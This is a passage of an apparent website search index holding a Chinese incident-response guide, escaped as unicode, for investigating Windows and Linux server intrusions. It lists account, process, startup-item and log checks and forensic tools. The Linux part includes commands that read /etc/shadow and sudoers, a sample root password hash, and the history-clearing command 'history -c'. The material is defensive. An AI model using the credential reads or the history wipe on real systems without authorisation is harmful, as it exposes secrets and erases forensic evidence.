\u540e\u8bb0"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","text":"\u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u5e38\u89c1\u7684\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u7c7b\uff1a web\u5165\u4fb5\uff1a\u7f51\u9875\u6302\u9a6c\u3001\u4e3b\u9875\u7be1\u6539\u3001Webshell \u7cfb\u7edf\u5165\u4fb5\uff1a\u75c5\u6bd2\u6728\u9a6c\u3001\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u63a7\u540e\u95e8 \u7f51\u7edc\u653b\u51fb\uff1aDDOS\u653b\u51fb\u3001DNS\u52ab\u6301\u3001ARP\u6b3a\u9a97 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9bWindow\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002 0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def \u00b6 1.1 \u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168 \u00b6 1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u6709\u5f31\u53e3\u4ee4\uff0c\u8fdc\u7a0b\u7ba1\u7406\u7aef\u53e3\u662f\u5426\u5bf9\u516c\u7f51\u5f00\u653e\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u636e\u5b9e\u9645\u60c5\u51b5\u54a8\u8be2\u76f8\u5173\u670d\u52a1\u5668\u7ba1\u7406\u5458\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 3\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 4\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R\u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\u201ceventvwr.msc\u201d\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 b\u3001\u5bfc\u51faWindows\u65e5\u5fd7--\u5b89\u5168\uff0c\u5229\u7528Log Parser\u8fdb\u884c\u5206\u6790\u3002 1.2 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3\u3001\u8fdb\u7a0b \u00b6 1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001netstat -ano \u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684ESTABLISHED b\u3001\u6839\u636enetstat \u5b9a\u4f4d\u51fa\u7684pid\uff0c\u518d\u901a\u8fc7tasklist\u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \u201cPID\u201d 2\u3001\u8fdb\u7a0b \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5f00\u59cb--\u8fd0\u884c--\u8f93\u5165msinfo32\uff0c\u4f9d\u6b21\u70b9\u51fb\u201c\u8f6f\u4ef6\u73af\u5883\u2192\u6b63\u5728\u8fd0\u884c\u4efb\u52a1\u201d\u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u3001\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU\u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684PID\uff1a netstat -ano | findstr \u201cport\u201d b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668--\u67e5\u770b--\u9009\u62e9\u5217--PID \u6216\u8005 tasklist | findstr \u201cPID\u201d c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u4efb\u52a1\u7ba1\u7406\u5668--\u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b--\u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u8fd0\u884c\u8f93\u5165 wmic\uff0ccmd\u754c\u9762 \u8f93\u5165 process d\u3001tasklist /svc \u8fdb\u7a0b--PID--\u670d\u52a1 e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a %system%/system32/drivers/etc/services\uff08\u4e00\u822c%system%\u5c31\u662fC:\\Windows\uff09 1.3 \u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1 \u00b6 1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce \u68c0\u67e5\u53f3\u4fa7\u662f\u5426\u6709\u542f\u52a8\u5f02\u5e38\u7684\u9879\u76ee\uff0c\u5982\u6709\u8bf7\u5220\u9664\uff0c\u5e76\u5efa\u8bae\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u75c5\u6bd2\u67e5\u6740\uff0c\u6e05\u9664\u6b8b\u7559\u75c5\u6bd2\u6216\u6728\u9a6c\u3002 d\u3001\u5229\u7528\u5b89\u5168\u8f6f\u4ef6\u67e5\u770b\u542f\u52a8\u9879\u3001\u5f00\u673a\u65f6\u95f4\u7ba1\u7406\u7b49\u3002 e\u3001\u7ec4\u7b56\u7565\uff0c\u8fd0\u884cgpedit.msc\u3002 2\u3001\u68c0\u67e5\u8ba1\u5212\u4efb\u52a1 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8bbe\u7f6e\u3011>\u3010\u63a7\u5236\u9762\u677f\u3011>\u3010\u4efb\u52a1\u8ba1\u5212\u3011\uff0c\u67e5\u770b\u8ba1\u5212\u4efb\u52a1\u5c5e\u6027\uff0c\u4fbf\u53ef\u4ee5\u53d1\u73b0\u6728\u9a6c\u6587\u4ef6\u7684\u8def\u5f84\u3002 b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff1b\u8f93\u5165 cmd\uff0c\u7136\u540e\u8f93\u5165at\uff0c\u68c0\u67e5\u8ba1\u7b97\u673a\u4e0e\u7f51\u7edc\u4e0a\u7684\u5176\u5b83\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u4f1a\u8bdd\u6216\u8ba1\u5212\u4efb\u52a1\uff0c\u5982\u6709\uff0c\u5219\u786e\u8ba4\u662f\u5426\u4e3a\u6b63\u5e38\u8fde\u63a5\u3002 3\u3001\u670d\u52a1\u81ea\u542f\u52a8 \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165services.msc\uff0c\u6ce8\u610f\u670d\u52a1\u72b6\u6001\u548c\u542f\u52a8\u7c7b\u578b\uff0c\u68c0\u67e5\u662f\u5426\u6709\u5f02\u5e38\u670d\u52a1\u3002 1.4 \u68c0\u67e5\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f \u00b6 1\u3001\u67e5\u770b\u7cfb\u7edf\u7248\u672c\u4ee5\u53ca\u8865\u4e01\u4fe1\u606f \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165systeminfo\uff0c\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f 2\u3001\u67e5\u627e\u53ef\u7591\u76ee\u5f55\u53ca\u6587\u4ef6 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001 \u67e5\u770b\u7528\u6237\u76ee\u5f55\uff0c\u65b0\u5efa\u8d26\u53f7\u4f1a\u5728\u8fd9\u4e2a\u76ee\u5f55\u751f\u6210\u4e00\u4e2a\u7528\u6237\u76ee\u5f55\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u5efa\u7528\u6237\u76ee\u5f55\u3002 Window 2003 C:\\Documents and Settings Window 2008R2 C:\\Users\\ b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165%UserProfile%\\Recent\uff0c\u5206\u6790\u6700\u8fd1\u6253\u5f00\u5206\u6790\u53ef\u7591\u6587\u4ef6\u3002 c\u3001\u5728\u670d\u52a1\u5668\u5404\u4e2a\u76ee\u5f55\uff0c\u53ef\u6839\u636e\u6587\u4ef6\u5939\u5185\u6587\u4ef6\u5217\u8868\u65f6\u95f4\u8fdb\u884c\u6392\u5e8f\uff0c\u67e5\u627e\u53ef\u7591\u6587\u4ef6\u3002 d\u3001\u56de\u6536\u7ad9\u3001\u6d4f\u89c8\u5668\u4e0b\u8f7d\u76ee\u5f55\u3001\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55 e\u3001\u4fee\u6539\u65f6\u95f4\u5728\u521b\u5efa\u65f6\u95f4\u4e4b\u524d\u7684\u4e3a\u53ef\u7591\u6587\u4ef6 3\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f a\u3001\u5229\u7528 Registry Workshop \u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u641c\u7d22\u529f\u80fd\uff0c\u53ef\u4ee5\u627e\u5230\u6700\u540e\u5199\u5165\u65f6\u95f4\u533a\u95f4\u7684\u6587\u4ef6\u3002 b\u3001\u5229\u7528\u8ba1\u7b97\u673a\u81ea\u5e26\u6587\u4ef6\u641c\u7d22\u529f\u80fd\uff0c\u6307\u5b9a\u4fee\u6539\u65f6\u95f4\u8fdb\u884c\u641c\u7d22\u3002 1.5 \u81ea\u52a8\u5316\u67e5\u6740 \u00b6 \u75c5\u6bd2\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u4e0b\u8f7d\u5b89\u5168\u8f6f\u4ef6\uff0c\u66f4\u65b0\u6700\u65b0\u75c5\u6bd2\u5e93\uff0c\u8fdb\u884c\u5168\u76d8\u626b\u63cf\u3002 webshell\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u9009\u62e9\u5177\u4f53\u7ad9\u70b9\u8def\u5f84\u8fdb\u884cwebshell\u67e5\u6740\uff0c\u5efa\u8bae\u4f7f\u7528\u4e24\u6b3ewebshell\u67e5\u6740\u5de5\u5177\u540c\u65f6\u67e5\u6740\uff0c\u53ef\u76f8\u4e92\u8865\u5145\u89c4\u5219\u5e93\u7684\u4e0d\u8db3\u3002 1.6 \u65e5\u5fd7\u5206\u6790 \u00b6 \u7cfb\u7edf\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u524d\u63d0\uff1a\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 b\u3001Win+R\u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\u201ceventvwr.msc\u201d\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 C\u3001\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u5b89\u5168\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\uff0c\u5229\u7528Log Parser\u8fdb\u884c\u5206\u6790\u3002 WEB\u8bbf\u95ee\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u627e\u5230\u4e2d\u95f4\u4ef6\u7684web\u65e5\u5fd7\uff0c\u6253\u5305\u5230\u672c\u5730\u65b9\u4fbf\u8fdb\u884c\u5206\u6790\u3002 b\u3001\u63a8\u8350\u5de5\u5177\uff1aWindow\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790 0x02 \u5de5\u5177\u7bc7 \u00b6 2.1 \u75c5\u6bd2\u5206\u6790 \u00b6 PCHunter\uff1a http://www.xuetr.com \u706b\u7ed2\u5251\uff1a https://www.huorong.cn Process Explorer\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker\uff1a https://processhacker.sourceforge.io/downloads.php autoruns\uff1a https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL\uff1a https://www.bleepingcomputer.com/download/otl/ SysInspector\uff1a http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 \u75c5\u6bd2\u67e5\u6740 \u00b6 \u5361\u5df4\u65af\u57fa\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \uff08\u63a8\u8350\u7406\u7531\uff1a\u7eff\u8272\u7248\u3001\u6700\u65b0\u75c5\u6bd2\u5e93\uff09 \u5927\u8718\u86db\uff1a http://free.drweb.ru/download+cureit+free \uff08\u63a8\u8350\u7406\u7531\uff1a\u626b\u63cf\u5feb\u3001\u4e00\u6b21\u4e0b\u8f7d\u53ea\u80fd\u75281\u5468\uff0c\u66f4\u65b0\u75c5\u6bd2\u5e93\uff09 \u706b\u7ed2\u5b89\u5168\u8f6f\u4ef6\uff1a https://www.huorong.cn 360\u6740\u6bd2\uff1a http://sd.360.cn/download_center.html 2.3 \u75c5\u6bd2\u52a8\u6001 \u00b6 CVERC-\u56fd\u5bb6\u8ba1\u7b97\u673a\u75c5\u6bd2\u5e94\u6025\u5904\u7406\u4e2d\u5fc3\uff1a http://www.cverc.org.cn \u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\uff1a https://x.threatbook.cn \u706b\u7ed2\u5b89\u5168\u8bba\u575b\uff1a http://bbs.huorong.cn/forum-59-1.html \u7231\u6bd2\u9738\u793e\u533a\uff1a http://bbs.duba.net \u817e\u8baf\u7535\u8111\u7ba1\u5bb6\uff1a http://bbs.guanjia.qq.com/forum-2-1.html 2.4 \u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51\u7ad9 \u00b6 http://www.virscan.org //\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51 v1.02\uff0c\u5f53\u524d\u652f\u6301 41 \u6b3e\u6740\u6bd2\u5f15\u64ce https://habo.qq.com //\u817e\u8baf\u54c8\u52c3\u5206\u6790\u7cfb\u7edf https://virusscan.jotti.org //Jotti\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u7cfb\u7edf http://www.scanvir.com //\u9488\u5bf9\u8ba1\u7b97\u673a\u75c5\u6bd2\u3001\u624b\u673a\u75c5\u6bd2\u3001\u53ef\u7591\u6587\u4ef6\u7b49\u8fdb\u884c\u68c0\u6d4b\u5206\u6790 2.5 webshell\u67e5\u6740 \u00b6 D\u76fe_Web\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6cwebshell\u67e5\u6740\uff1a http://www.shellpub.com \u6df1\u4fe1\u670dWebshell\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177\uff1a http://edr.sangfor.com.cn/backdoor_detection.html Safe3\uff1a http://www.uusec.com/webshell.zip \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u00b6 0x00 \u524d\u8a00 \u00b6 \u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9bLinux\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002 0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def \u00b6 1.1 \u8d26\u53f7\u5b89\u5168 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6/etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540eshell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6/etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559 who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty\u672c\u5730\u767b\u9646 pts\u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d \u5165\u4fb5\u6392\u67e5\uff1a 1\u3001\u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2\u3001\u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3\u3001\u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4\u3001\u7981\u7528\u6216\u5220\u9664\u591a\u4f59\u53ca\u53ef\u7591\u7684\u5e10\u53f7 usermod -L user \u7981\u7528\u5e10\u53f7\uff0c\u5e10\u53f7\u65e0\u6cd5\u767b\u5f55\uff0c/etc/shadow\u7b2c\u4e8c\u680f\u4e3a!\u5f00\u5934 userdel user \u5220\u9664user\u7528\u6237 userdel -r user \u5c06\u5220\u9664user\u7528\u6237\uff0c\u5e76\u4e14\u5c06/home\u76ee\u5f55\u4e0b\u7684user\u76ee\u5f55\u4e00\u5e76\u5220\u9664 1.2 \u5386\u53f2\u547d\u4ee4 \u00b6 \u57fa\u672c\u4f7f\u7528\uff1a \u901a\u8fc7.bash_history\u67e5\u770b\u5e10\u53f7\u6267\u884c\u8fc7\u7684\u7cfb\u7edf\u547d\u4ee4 1\u3001root\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00/home\u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684.bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u7684\u5386\u53f2\u547d\u4ee4 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684IP\u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a ######jiagu history xianshi######### USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3\uff09source /etc/profile\u8ba9\u914d\u7f6e\u751f\u6548 \u751f\u6210\u6548\u679c\uff1a 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3\u3001\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u7684\u6e05\u9664\uff1ahistory -c 